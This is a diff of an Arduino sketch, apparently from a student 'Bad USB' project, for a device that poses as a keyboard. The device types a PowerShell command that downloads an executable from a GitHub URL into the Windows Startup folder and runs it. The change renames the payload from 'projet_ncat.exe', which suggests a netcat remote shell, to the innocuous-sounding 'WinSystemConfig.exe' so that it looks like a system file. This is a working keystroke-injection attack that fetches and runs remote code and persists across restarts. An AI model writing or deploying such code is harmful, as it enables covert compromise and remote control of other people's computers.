@@ -21,7 +21,7 @@ void setup() {
   Keyboard.write(KEY_RETURN);
   delay(1500);
 
-  String cmd = "https://raw.githubusercontent.com/Tristan654/Projet_Bad_USB/main/Python_file/Executable_windows/dist/projet_ncat.exe";
+  String cmd = "https://raw.githubusercontent.com/Tristan654/Projet_Bad_USB/main/Executable/Executable_Windows/dist/WinSystemConfig.exe";
   Keyboard.print("$p=$env:APPDATA+'\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinSystemConfig.exe'; iwr " + cmd + " -o $p; Start-Process $p");  
   Keyboard.write(KEY_RETURN);
   Keyboard.releaseAll();
